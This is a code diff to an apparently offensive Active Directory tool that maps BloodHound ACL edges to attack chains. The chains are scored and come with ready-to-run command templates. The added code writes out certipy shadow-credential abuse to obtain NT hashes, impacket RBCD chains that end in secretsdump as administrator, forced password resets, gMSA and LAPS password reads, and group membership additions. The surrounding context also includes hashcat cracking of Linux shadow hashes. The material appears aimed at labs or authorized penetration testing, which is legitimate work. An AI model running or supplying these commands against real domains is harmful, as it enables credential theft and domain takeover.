@@ -61,6 +61,12 @@ class _Ents:
         self.shadow_src = self.gpp_src = self.pkey_src = self.cert_src = None
         self.ccache_src = self.tgs_src = self.asrep_src = None
         self.sam_dirs = {}     # dir -> set(hive names)
+        # iter-23: ACL edges from BloodHound + ADCS cert templates from
+        # certipy/BloodHound CE. These drive R-SHADOW / R-WRITEDACL /
+        # R-ADCS chains. acl_edges is list of dicts so we can route by
+        # both right-name and target object.
+        self.acl_edges = []
+        self.cert_templates = []
 
 
 def _add_cred(e, user, pw, src, line):
@@ -170,6 +176,27 @@ def _entities(report, store):
             e.kerberoastable.add(ev.user)
         elif ev.fact == "asreproastable":
             e.asreproastable.add(ev.user)
+        # iter-23: ACL edges (BloodHound Aces[]) and cert templates
+        # (certipy find / BloodHound CE certtemplates).
+        if ev.kind == "acl_edge" and ev.fact:
+            m = ev.meta or {}
+            e.acl_edges.append({
+                "right": ev.fact,
+                "target": ev.host,
+                "principal": ev.user,
+                "ptype": m.get("principal_type", ""),
+                "target_kind": m.get("target_kind", ""),
+                "src": ev.source, "line": ev.line,
+            })
+        if ev.kind == "cert_template":
+            m = ev.meta or {}
+            e.cert_templates.append({
+                "template": m.get("template", ""),
+                "ca": m.get("ca", ""),
+                "esc": m.get("esc") or [],
+                "lab_only": bool(m.get("lab_only")),
+                "src": ev.source, "line": ev.line,
+            })
     return e
 
 
@@ -499,6 +526,104 @@ def run(report, store, ui=None):
         chains.append(Chain("R21", "crack shadow", "Linux shadow hash present",
             crit=5, conf=0.8, ready=0.7, prox=0.6,
             commands=["unshadow passwd shadow > u; hashcat -m 1800 u rockyou.txt"], src=s, line=l))
+
+    # iter-23: ACL-edge chains.
+    # When the operator owns ANY plaintext credential AND BloodHound reveals
+    # an abusable Aces[] right from that principal to a target, emit a
+    # concrete certipy-shadow / dacledit / addcomputer / rbcd-attack command.
+    # The principal in Aces[] is reported as a SID (BloodHound doesn't
+    # cross-resolve in the JSON), so we phrase the command as the OPERATOR's
+    # owned principal acting via -u — the SID is shown in the summary for
+    # the operator to confirm the route in the BloodHound GUI.
+    have_creds = bool(e.creds)
+    if e.acl_edges and have_creds:
+        seen = set()
+        # AddKeyCredentialLink -> Shadow Credentials -> NT hash via PKINIT.
+        # Highest-leverage modern abuse: no password reset, fully reversible.
+        for edge in e.acl_edges:
+            r = edge["right"]
+            tgt = edge["target"] or "<target>"
+            key = (r, tgt)
+            if key in seen:
+                continue
+            seen.add(key)
+            if r == "AddKeyCredentialLink":
+                chains.append(Chain("R-SHADOW", "shadow credentials",
+                    f"AddKeyCredentialLink on {tgt} (Shadow Creds -> PKINIT -> NT hash)",
+                    crit=9, conf=0.85, ready=1.4, prox=0.9,         # score 9.64
+                    commands=[
+                        f"certipy-ad shadow auto -u '<owned-user>@<dom>' "
+                        f"-p '<password>' -account '{tgt}' -dc-ip <DC>",
+                        f"# certipy prints {tgt}'s NT hash; PtH (see R7)",
+                    ], src=edge["src"], line=edge["line"]))
+            elif r in ("GenericAll", "GenericWrite", "WriteDacl", "WriteOwner"):
+                # If target is a user, ForceChangePassword path; if computer,
+                # RBCD path. iter-23: target_kind from meta is reliable;
+                # bloodhound stores computers as FQDN (no '$' suffix).
+                computer = (edge.get("target_kind") == "computers"
+                            or tgt.endswith("$"))
+                if computer:
+                    # Derive sam-style host name (no $/.fqdn) for RBCD CLI.
+                    # 'WEB01.HTB.LOCAL' -> 'WEB01'; 'WEB01$' -> 'WEB01'.
+                    host_short = tgt.split(".")[0].rstrip("$")
+                    fqdn = tgt if "." in tgt else f"{host_short}.<dom>"
+                    chains.append(Chain("R-RBCD", "RBCD via writeable AD object",
+                        f"{r} on computer {tgt} (RBCD -> S4U2self+U2U -> LocalSystem)",
+                        crit=8, conf=0.7, ready=1.2, prox=0.85,     # score 5.71
+                        commands=[
+                            f"impacket-addcomputer -computer-name 'attacker$' "
+                            f"-computer-pass 'P@ssw0rd!' -dc-host <DC> "
+                            f"'<dom>/<owned-user>:<password>'",
+                            f"impacket-rbcd -delegate-from 'attacker$' "
+                            f"-delegate-to '{host_short}$' -action write "
+                            f"'<dom>/<owned-user>:<password>'",
+                            f"impacket-getST -spn 'cifs/{fqdn}' "
+                            f"-impersonate administrator '<dom>/attacker$:P@ssw0rd!'",
+                            f"export KRB5CCNAME=administrator.ccache; "
+                            f"impacket-secretsdump -k -no-pass '<dom>/administrator@{fqdn}'",
+                        ], src=edge["src"], line=edge["line"]))
+                else:
+                    chains.append(Chain("R-WRITEDACL", "force-change-password via writeable user",
+                        f"{r} on user {tgt} (ForceChangePassword -> own as DA?)",
+                        crit=7, conf=0.7, ready=1.3, prox=0.85,     # score 5.42
+                        commands=[
+                            f"net rpc password '{tgt}' '<NewP@ss123!>' "
+                            f"-U '<dom>/<owned-user>%<password>' -S <DC>",
+                            f"netexec smb <DC> -u '{tgt}' -p '<NewP@ss123!>' --shares",
+                        ], src=edge["src"], line=edge["line"]))
+            elif r == "ForceChangePassword":
+                chains.append(Chain("R-WRITEDACL", "ForceChangePassword",
+                    f"ForceChangePassword on {tgt}",
+                    crit=7, conf=0.8, ready=1.4, prox=0.85,         # score 6.66
+                    commands=[
+                        f"net rpc password '{tgt}' '<NewP@ss123!>' "
+                        f"-U '<dom>/<owned-user>%<password>' -S <DC>",
+                    ], src=edge["src"], line=edge["line"]))
+            elif r == "ReadGMSAPassword":
+                chains.append(Chain("R-GMSA-READ", "read gMSA password",
+                    f"ReadGMSAPassword on {tgt}",
+                    crit=8, conf=0.9, ready=1.5, prox=0.9,          # score 9.72
+                    commands=[
+                        f"netexec ldap <DC> -u '<owned-user>' -p '<password>' --gmsa",
+                        f"# or: impacket-gMSADumper -u '<owned-user>' "
+                        f"-p '<password>' -d '<dom>' -l <DC>",
+                    ], src=edge["src"], line=edge["line"]))
+            elif r == "ReadLAPSPassword":
+                chains.append(Chain("R-LAPS-READ", "read LAPS password",
+                    f"ReadLAPSPassword on {tgt}",
+                    crit=8, conf=0.9, ready=1.5, prox=0.9,          # score 9.72
+                    commands=[
+                        f"netexec ldap <DC> -u '<owned-user>' -p '<password>' "
+                        f"--laps  # filter to {tgt}",
+                    ], src=edge["src"], line=edge["line"]))
+            elif r == "AddMember":
+                chains.append(Chain("R-ADDMEMBER", "AD group add-member",
+                    f"AddMember on group {tgt}",
+                    crit=6, conf=0.7, ready=1.3, prox=0.8,
+                    commands=[
+                        f"impacket-net rpc group addmem '{tgt}' '<owned-user>' "
+                        f"-U '<dom>/<owned-user>%<password>' -S <DC>",
+                    ], src=edge["src"], line=edge["line"]))
     # SAM/SYSTEM/SECURITY triad in one dir -> local secretsdump (no network).
     # iter-13: conf=1.0 was 'command will succeed', but conf encodes 'likelihood
     # of access'. SAM gives LOCAL hashes only - useful where the originating
